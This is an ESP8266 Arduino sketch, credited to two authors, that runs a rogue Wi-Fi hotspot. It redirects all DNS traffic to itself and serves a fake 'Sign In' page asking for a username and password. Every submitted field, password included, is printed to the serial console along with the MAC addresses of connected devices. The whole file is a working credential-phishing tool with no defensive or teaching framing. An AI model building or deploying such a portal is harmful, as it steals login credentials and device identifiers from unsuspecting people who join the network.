/*
   Captive Portal by: M. Ray Burnette 20150831
   See Notes tab for original code references and compile requirements
   Sketch uses 300,640 bytes (69%) of program storage space. Maximum is 434,160 bytes.
   Global variables use 50,732 bytes (61%) of dynamic memory, leaving 31,336 bytes for local variables. Maximum is 81,920 bytes.

   Modified by Reed Haffner to pull GET requests from HMTL page.
*/

#include <ESP8266WiFi.h>
#include "./DNSServer.h"                  // Patched lib
#include <ESP8266WebServer.h>
extern "C" {
  #include<user_interface.h>
}

const byte        DNS_PORT = 53;          // Capture DNS requests on port 53
IPAddress         apIP(10, 10, 10, 1);    // Private network for server
DNSServer         dnsServer;              // Create the DNS object
ESP8266WebServer  webServer(80);          // HTTP server

String responseHTML = "<!DOCTYPE html><html><head> <title>Captive Portal</title> <meta name='viewport' content='width=device-width,initial-scale=1'></head><body> <form accept-charset='UTF-8' action='' id='sign_in_form' method='get'> <div style='margin:0;padding:0;display:inline'><input name='utf8' type='hidden' value='&#x2713;' /></div> <div id='signin_form' class='formarea'> <h3>USERNAME</h3> <input id='email_field' name='email' type='text'> <h3>PASSWORD</h3> <input id='password_field' name='password' type='password' class='jsAnalyticsExclude'> <input class='btn btn-default' id='sign_in' name='commit' type='submit' value='Sign In' /> </div> </form></body></html>";

void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Captive Portal");
  Serial.println("Created Hotspot");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });
  webServer.begin();
  digitalWrite(LED_BUILTIN, LOW);\
  Serial.println("Hotspot up & running.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if(webServer.args() != 0){
    showClients();
    for(int i=0; i< webServer.args(); i++){
      Serial.println(webServer.argName(i) + ": " + webServer.arg(i));
    }
    delay(5000);
  }
}

void showClients()
{
  struct station_info *stat_info;
  stat_info = wifi_softap_get_station_info();
  uint8_t client_count = wifi_softap_get_station_num();
  String str = "Number of clients = ";
  str += String(client_count);
  str += "\r\nList of clients : \r\n";
  int i = 1;
  while (stat_info != NULL) {
    str += "Station #";
    str += String(i);
    str += " : ";
    str += String(stat_info->bssid[0], HEX);
    str += ":";
    str += String(stat_info->bssid[1], HEX);
    str += ":";
    str += String(stat_info->bssid[2], HEX);
    str += ":";
    str += String(stat_info->bssid[3], HEX);
    str += ":";
    str += String(stat_info->bssid[4], HEX);
    str += ":";
    str += String(stat_info->bssid[5], HEX);
    str += "\r\n";
    i++;
    stat_info = STAILQ_NEXT(stat_info, next);
//    stat_info = stat_info->next;
    }
  Serial.println(str);
}

